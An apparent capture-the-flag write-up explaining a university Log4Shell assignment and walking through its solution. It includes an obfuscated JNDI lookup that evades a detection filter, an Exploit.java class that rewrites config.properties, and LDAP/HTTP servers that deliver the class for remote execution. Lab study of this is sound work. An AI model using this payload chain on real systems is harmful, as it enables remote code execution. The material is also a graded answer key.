@@ -1,0 +1,127 @@
+I'll explain this cybersecurity project in a simple way!
+
+This project is about finding a security weakness in a cartoon website that uses something called "Log4j" (a tool that websites use to keep track of what's happening).
+
+Here's what you need to do:
+
+1. The website has a list of cartoons. Your mission is to change the "rating" of these cartoons to your student ID number.
+
+2. There's a special file called "config.properties" that controls the cartoon ratings. You need to find a way to change this file without breaking anything else in it.
+
+3. The tricky part is that the website has protection to stop people from doing exactly what you're trying to do! You need to be clever and find a way around this protection.
+
+4. From the comments in the document, it looks like many students found a "out of place" variable in the website logs that can be used as an entry point. This is called an "attack vector."
+
+5. When trying to use this entry point, many students got a "teapot error" message. This means the website detected their attempt and blocked it. You need to "obfuscate" (hide) your attack to get past this.
+
+6. You'll need to write a special Java program (called Exploit.java) that will modify the config.properties file to change just the rating while keeping everything else the same.
+
+7. If you do everything correctly, when you look up a cartoon, it will show your student ID as the rating, and you'll see a flag (a special code that proves you completed the challenge).
+
+The project is teaching you about a real security problem that affected many websites in 2021 called "Log4Shell" and how attackers might use it to change things they shouldn't be able to change.
+
+
+
+how we achived this ----
+
+
+
+
+Detailed Explanation of Flag 3 Solution
+I'm glad you got the flag! Let me walk you through exactly what we did and why it worked:
+Understanding the Attack Vector
+
+Identifying the Vulnerability:
+
+We analyzed the logs and found that the application was logging a parameter called dangerZone which appeared as "null" in the logs.
+This parameter wasn't being visibly used in the application but was being logged by Log4j, making it a perfect "out-of-place" attack vector as hinted in the instructions.
+
+
+Testing the Parameter:
+
+We confirmed this was our attack vector by passing a simple value (dangerZone=test) and observing it was correctly logged in the application.
+
+
+
+The Log4j Vulnerability (Log4Shell)
+The application uses Log4j, which is vulnerable to the Log4Shell vulnerability (CVE-2021-44228). When it logs user-controlled input, it evaluates expressions like ${jndi:ldap://...}, allowing us to:
+
+Trigger a JNDI lookup to our malicious LDAP server
+The LDAP server redirects to our HTTP server
+The application loads and executes our malicious class
+
+Bypassing Protection
+The application had protection against simple Log4j exploits, showing a "teapot" error when detecting standard JNDI lookups. We bypassed this by obfuscating our payload:
+
+We used the format ${j${::-}n${::-}d${::-}i:ldap://172.17.0.1:1389/Exploit}
+This syntax splits "jndi" into individual characters with a reversal operator ::-
+Log4j resolves these nested expressions before processing the JNDI lookup
+The protection mechanism checks for plain strings like "jndi" but doesn't detect our obfuscated version
+
+The Exploit Code
+Our Exploit.java file was designed to:
+
+Load the existing config.properties file
+Preserve all existing properties
+Update only the rating property to your GATECH_ID (904074283)
+Save the file back
+
+This was crucial because:
+
+The application checks if the file was tampered with
+Overwriting the entire file would trigger protection
+We needed to update just one property while preserving others
+
+javaCopyimport java.io.FileInputStream;
+import java.io.FileOutputStream;
+import java.util.Properties;
+
+public class Exploit {
+    static {
+        try {
+            // Load the existing properties file
+            Properties props = new Properties();
+            FileInputStream in = new FileInputStream("config.properties");
+            props.load(in);
+            in.close();
+            
+            // Update only the rating property to your GATECH_ID
+            props.setProperty("rating", "904074283");
+            
+            // Save the properties back to the file
+            FileOutputStream out = new FileOutputStream("config.properties");
+            props.store(out, null);
+            out.close();
+            
+            System.out.println("Successfully updated rating property!");
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+}
+Setting Up the Attack Infrastructure
+We set up two servers:
+
+LDAP Server: Listened on port 1389 and was configured to redirect to our HTTP server when contacted.
+HTTP Server: Served our compiled Exploit.class file that the application would download and execute.
+
+Executing the Attack
+When we sent our final payload:
+
+The application logged our obfuscated payload
+Log4j resolved the nested expressions, turning it into ${jndi:ldap://172.17.0.1:1389/Exploit}
+Log4j performed a JNDI lookup to our LDAP server
+Our LDAP server redirected to our HTTP server
+The application downloaded and executed our Exploit.class
+Our exploit code updated the rating property to 904074283
+The application processed the modified properties file
+When we accessed the cartoon endpoint again, the flag was returned in the network field
+
+Key Lessons
+
+Identifying Attack Vectors: Looking for "out-of-place" parameters that might be logged but not visibly used
+Obfuscation Techniques: Bypassing security filters by encoding or obfuscating payloads
+Precise Exploitation: Updating only what's necessary while preserving the rest to avoid detection
+Understanding System Flow: Timing the attack to occur before the application reads the properties
+
+This flag was particularly challenging because it required finding the right attack vector, properly obfuscating the payload to bypass protection, and writing Java code that carefully updated only the necessary property.
